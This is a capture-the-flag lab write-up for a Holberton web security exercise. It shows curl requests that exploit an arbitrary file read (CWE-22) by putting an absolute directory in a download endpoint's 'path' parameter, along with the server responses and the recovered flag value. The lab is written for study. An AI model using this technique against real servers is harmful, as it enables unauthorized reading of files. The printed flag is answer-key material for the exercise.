# Task 1. Another filter won't help

## **Task Description**

Your initial objective entails identifying the vulnerable endpoint and securing the flag located at /tmp/secure_storage/1-flag.txt.

Target Machine: Cyber - WebSec 0x07 \
Main Endpoint: http://web0x07.hbtn/task1/list_file

Useful instructions:

1. Start by exploring the initial endpoint to understand its functionality.
2. Check page source for every endpoint to discover hidden links or references.
3. Investigate how file paths are processed and what parameters are accepted.
4. Look for alternative endpoints that might handle file downloads or retrieval.
5. Experiment with providing both filename and full path parameters.

Repo:

GitHub repository: dlh-cyber_security \
Directory: web_application_security/0x07_file_inclusion \
File: 1-flag.txt



## **Solution**



- Start sandbox `cyber_websec_0x07`.
- Start openvpn.
- Put IP address of the sandbox in `/etc/hosts` file.
```bash
echo "10.42.227.159 web0x07.hbtn" | sudo tee -a /etc/hosts
sudo vim /etc/hosts
ping -c 2 web0x07.hbtn
```

## Task 1: Another filter won't help

Objective: Retrieve `/tmp/secure_storage/1-flag.txt`.

Since Task 1 mentions an additional filter and alternative download endpoints, we'll first inspect the HTML for clues about how file retrieval is implemented.

### Step 1: Inspect the main endpoint

Execute this command in your Kali terminal:

```bash
curl -i -sS 'http://web0x07.hbtn/task1/list_file'
```

What we're looking for:

- Download links and their query parameters.
- References to alternative file retrieval endpoints.
- Differences from Task 0's `download_file?filename=...&path=...` structure.
- HTML comments or other clues in the source.

```bash
curl -i -sS 'http://web0x07.hbtn/task1/list_file'

HTTP/1.1 200 OK
Server: nginx/1.26.3
Date: Thu, 12 Nov 2026 18:32:29 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 881
Connection: keep-alive
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self';
Via: waitress
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-Xss-Protection: 1; mode=block

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>List of Files</title>
    <link rel="stylesheet" type="text/css" href="/static/css/style.css">
</head>
<body>
    <div class="outer-container">
        <div class="inner-container">
            <img src="/static/img/holberton_logo.png" alt="Logo" class="logo">
            <div class="container">
                <h1>1. List of Files in the Hub</h1>
                <div class="separator"></div>
                <ul>

                    <li>
                        <a href="download_file?filename=README.md&amp;path=.">
                            README.md
                        </a>
                    </li>

                </ul>
            </div>
        </div>
    </div>
</body>
</html>
```


### Step 2: Test the download endpoint with an absolute path

The HTML reveals the same download structure as Task 0:

```
GET /task1/download_file?filename=README.md&path=.
```

This suggests the application still accepts two parameters:

- `filename`: The requested file.
- `path`: The directory containing that file.

However, the task title, "Another filter won't help," suggests that additional validation may have been introduced.

Let's establish whether the previous vulnerability still works.

Execute:

```bash
curl -i -sS 'http://web0x07.hbtn/task1/download_file?filename=1-flag.txt&path=/tmp/secure_storage'
```

This requests:

```
/tmp/secure_storage/1-flag.txt
```

What we're testing: Whether the application permits an absolute directory path, rejects it through a filter, or handles it differently from Task 0.

```bash
curl -i -sS 'http://web0x07.hbtn/task1/download_file?filename=1-flag.txt&path=/tmp/secure_storage'

HTTP/1.1 200 OK
Server: nginx/1.26.3
Date: Thu, 12 Nov 2026 18:34:59 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 40
Connection: keep-alive
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self';
Via: waitress
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-Xss-Protection: 1; mode=block

FLAG_1: 23115af2a90ca648e16090845643f75d
```


&#x20;Task 1 completed

You successfully retrieved the flag from `/tmp/secure_storage/1-flag.txt`.

FLAG_1

23115af2a90ca648e16090845643f75d

### Vulnerability analysis

Vulnerability: Arbitrary File Read via an attacker-controlled path parameter (CWE-22).

Vulnerable endpoint:

```
GET /task1/download_file
```

Successful exploit:

```
curl 'http://web0x07.hbtn/task1/download_file?filename=1-flag.txt&path=/tmp/secure_storage'
```

The server returned `HTTP/1.1 200 OK` with the flag.

### Why it worked

The application accepts two parameters:

- `filename=1-flag.txt`
- `path=/tmp/secure_storage`

The endpoint allows the supplied absolute path to be used for file retrieval, exposing a file outside the intended download directory.

Important distinction: We have demonstrated arbitrary file access using an absolute path. We have not yet established what filtering Task 1 implements or whether another endpoint bypasses that filtering.

The result is sufficient to complete the objective.

## Step 3: Save the Flag

```bash
echo "23115af2a90ca648e16090845643f75d" > 1-flag.txt
git add .
git commit -m "1-flag.txt"
git push
```
